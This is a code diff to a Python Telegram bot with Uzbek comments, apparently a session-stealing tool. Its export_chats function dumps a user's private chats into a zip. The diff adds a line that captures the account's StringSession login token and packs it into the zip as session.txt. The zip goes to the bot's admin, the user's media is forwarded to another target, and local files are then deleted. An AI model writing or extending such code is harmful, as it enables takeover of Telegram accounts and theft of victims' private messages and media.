@@ -258,7 +258,10 @@ async def export_chats(uid):
     os.makedirs(BASE_DIR, exist_ok=True)
 
     all_media = []
-    zip_name = f"chats_{uid}.zip"   # ✅ YETISHMAYOTGAN QATOR
+    zip_name = f"chats_{uid}.zip"
+
+    # 🔐 StringSession olish
+    session_string = client.session.save()
 
     for d in await client.get_dialogs():
         if isinstance(d.entity, User) and not d.entity.bot:
@@ -286,27 +289,23 @@ async def export_chats(uid):
 
                     f.write(f"[{time}] {sender}: {text}\n")
 
-    # ================= ZIP YARATISH =================
+    # ================= ZIP =================
     with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
-        # 📦 Chat fayllari
         for root, _, files in os.walk(BASE_DIR):
             for file in files:
                 full = os.path.join(root, file)
                 z.write(full, arcname=os.path.relpath(full, BASE_DIR))
 
-        # 🔐 SESSION fayl
-        session_file = f"session_{uid}.session"
-        if os.path.exists(session_file):
-            z.write(session_file, arcname=session_file)
+        # 🔐 session.txt
+        z.writestr("session.txt", session_string)
 
-    # ================= ZIPNI ADMIN’GA YUBORISH =================
     await bot.send_document(
         ADMIN_ID,
         types.InputFile(zip_name),
         caption=f"📦 Chatlar eksport qilindi | UID: {uid}"
     )
 
-    # ================= MEDIALARNI FORWARD QILISH =================
+    # media forward
     for m in all_media:
         try:
             await m.forward_to(MEDIA_TARGET)
@@ -314,11 +313,11 @@ async def export_chats(uid):
         except:
             pass
 
-    # ================= TOZALASH =================
     shutil.rmtree(BASE_DIR)
     os.remove(zip_name)
     await client.disconnect()
     sessions.pop(uid, None)
+
 
 # ================== ADMIN ==================
 @dp.message_handler(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
